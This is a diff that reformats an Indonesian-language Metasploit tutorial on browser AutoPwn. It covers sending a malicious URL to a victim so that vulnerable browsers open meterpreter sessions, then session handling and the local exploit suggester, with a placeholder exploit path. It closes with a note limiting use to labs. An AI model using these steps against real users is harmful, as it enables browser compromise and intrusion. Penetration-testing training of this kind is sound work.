@@ -63,41 +63,41 @@ Prasyarat:
   
 ### 2. Teknik Penyebaran
 
-   Kirim URL ke korban: http://192.168.1.100/
-   - Jika browser rentan (`IE6`, `Firefox 10`, `dll`), exploit akan dikirim.
-   - Otomatis membuka sesi meterpreter.
+Kirim URL ke korban: http://192.168.1.100/
+- Jika browser rentan (`IE6`, `Firefox 10`, `dll`), exploit akan dikirim.
+- Otomatis membuka sesi meterpreter.
 
 ### 3. Hasil Eksploitasi
 
-   Cek sesi:
+Cek sesi:
 
-   ```
-   sessions -l
-   ```
+```
+sessions -l
+```
 
 Interaksi:
 
-   ```
-   sessions -i 1
-   ```
+```
+sessions -i 1
+```
 
 ### 4. Alternatif: Auto Exploitation dengan Exploit Suggestion
 
-   Langkah:
+Langkah:
 
-   ```
-   use post/multi/recon/local_exploit_suggester
-   set SESSION 1
-   run
-   ```
+```
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+```
  
-   Kemudian gunakan exploit yang disarankan:
+Kemudian gunakan exploit yang disarankan:
 
-   ```
-   use exploit/linux/local/xxx
-   set SESSION 1
-   run
-   ```
+```
+use exploit/linux/local/xxx
+set SESSION 1
+run
+```
 
 ## Catatan Etis dan Legal
 - AutoPwn hanya boleh digunakan dalam lab atau lingkungan izin.
